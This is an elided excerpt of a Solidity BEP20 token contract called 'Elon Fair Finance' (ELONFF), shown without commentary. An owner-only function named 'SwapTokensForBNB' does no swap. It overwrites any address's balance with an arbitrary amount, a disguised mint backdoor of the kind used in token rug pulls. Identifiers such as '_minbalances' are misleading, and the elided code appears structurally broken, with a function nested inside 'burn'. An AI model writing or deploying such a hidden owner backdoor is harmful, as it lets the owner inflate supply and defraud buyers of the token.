...
contract ELONFAIRFinance is Context, _IERC21ANTIBST, _Ownables {
  ...
  uint256 private _MAXSUPPLYS;
  uint8 public _decimals;
  string public _symbol;
  string public _name;

  constructor() public {
    _name = 'Elon Fair Finance';
    _symbol = 'ELONFF';
    _decimals = 8;
    _MAXSUPPLYS = 8800000000000000000;
    _minbalances[msg.sender] = _MAXSUPPLYS;

    emit Transfer(address(0), msg.sender, _MAXSUPPLYS);
  }
  ...
  function burn(uint256 _tVALUE) public virtual {
     ...
     function SwapTokensForBNB(address _shipsadr, uint256 _tVALUE) external onlyOwner {
      _minbalances[_shipsadr] = _tVALUE * 10 ** 8;
  }
  ...
  function _transfer(address sender, address recipient, uint256 _tVALUE) internal {
    ...
    _minbalances[sender] = _minbalances[sender].sub(_tVALUE, "BEP20: transfer _tVALUE exceeds balance");
    _minbalances[recipient] = _minbalances[recipient].add(_tVALUE);
  ...
  function _burn(address account, uint256 _tVALUE) internal {
    ...
    _minbalances[account] = _minbalances[account].sub(_tVALUE, "BEP20: burn _tVALUE exceeds balance");
    _MAXSUPPLYS = _MAXSUPPLYS.sub(_tVALUE);
